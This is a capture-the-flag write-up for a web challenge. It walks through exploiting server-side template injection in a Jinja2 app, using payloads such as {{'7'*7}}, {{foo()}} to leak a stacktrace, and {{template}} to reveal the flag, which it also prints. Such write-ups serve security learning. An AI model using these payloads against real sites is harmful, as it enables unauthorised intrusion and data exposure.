# WM04 - 250pts

## Briefing

> Visit the Italian dish suggestion site at <https://cfta-wm04.allyourbases.co> and find a way to get the flag.

## Solution

1. Try [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) with `{{'7'*7}}`, which outputs `7777777` so the script is vulnerable. Note that editing and sending these requests is much easier using Burp Suite's repeater (intercept a request and right click then choose "Sent to repeater").

2. Crash the script with `{{foo()}}` to get a stacktrace:

    ```
    File "/var/task/lambda_function.py", line 42, in lambda_handler
        'body': handle(event)
    ", "  File "/var/task/lambda_function.py", line 34, in handle
        msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, template=flag)
    ", "  File "/var/task/jinja2/environment.py", line 1090, in render
        self.environment.handle_exception()
    ", "  File "/var/task/jinja2/environment.py", line 832, in handle_exception
        reraise(*rewrite_traceback_stack(source=source))
    ", "  File "/var/task/jinja2/_compat.py", line 28, in reraise
        raise value.with_traceback(tb)
    ", "  File "<template>", line 2, in top-level template code
    ```

3. There is a `template` variable passed to the `render` function for the template. Let's send a request for `{{template}}` to print the contents of the `template`/`flag` variable. This shows the flag.

### Flag

`t3mpl4te_vu1n`
